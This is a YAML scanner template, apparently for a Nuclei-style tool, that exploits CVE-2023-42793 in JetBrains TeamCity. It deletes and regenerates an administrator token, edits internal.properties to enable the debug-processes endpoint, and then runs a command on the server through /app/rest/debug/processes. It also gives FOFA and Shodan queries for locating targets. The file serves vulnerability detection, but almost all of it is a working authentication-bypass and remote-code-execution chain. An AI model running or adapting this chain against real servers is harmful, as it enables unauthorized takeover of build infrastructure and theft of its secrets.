id: CVE-2023-42793

info:
  name: JetBrains TeamCity < 2023.05.4 - Remote Code Execution
  author: iamnoooob,rootxharsh,pdresearch
  severity: critical
  verified: true
  description: |
    In JetBrains TeamCity before 2023.05.4 authentication bypass leading to RCE on TeamCity Server was possible
    FOFA: title=TeamCity
    SHODAN: title:TeamCity
  reference:
    - https://www.jetbrains.com/privacy-security/issues-fixed/
    - https://attackerkb.com/topics/1XEEEkGHzt/cve-2023-42793/rapid7-analysis
    - https://www.sonarsource.com/blog/teamcity-vulnerability
    - https://nvd.nist.gov/vuln/detail/CVE-2023-42793
  tags: cve,cve2023,jetbrains,teamcity,rce,auth-bypass,intrusive
  created: 2023/10/12

set:
  hostname: request.url.host
  randstr: randomLowercase(32)
rules:
  r0:
    request:
      method: DELETE
      path: /app/rest/users/id:1/tokens/RPC2
    expression: response.status == 204
  r1:
    request:
      method: POST
      path: /app/rest/users/id:1/tokens/RPC2
    expression: response.body.bcontains(b'<token name="RPC2" creationTime')
    output:
      search: '"value=\"(?P<token>.*?)\"".bsubmatch(response.body)'
      token: search["token"]
  r2:
    request:
      method: POST
      path: /admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true
      headers:
        Authorization: Bearer {{token}}
    expression: response.status == 200
  r3:
    request:
      method: POST
      path: /admin/admin.html?item=diagnostics&tab=dataDir&file=config/internal.properties
      headers:
        Authorization: Bearer {{token}}
    expression: response.status == 200
  r4:
    request:
      raw: |
        POST /app/rest/debug/processes?exePath=echo&params={{randstr}} HTTP/1.1
        Host: {{hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F
        Connection: close
        Content-Length: 0
        Authorization: Bearer {{token}}
        Accept-Encoding: gzip
      
    expression: response.body.bcontains(b'StdOut:') && response.body.bcontains(bytes(randstr))
expression: r0() && r1() && r2() && r3() && r4()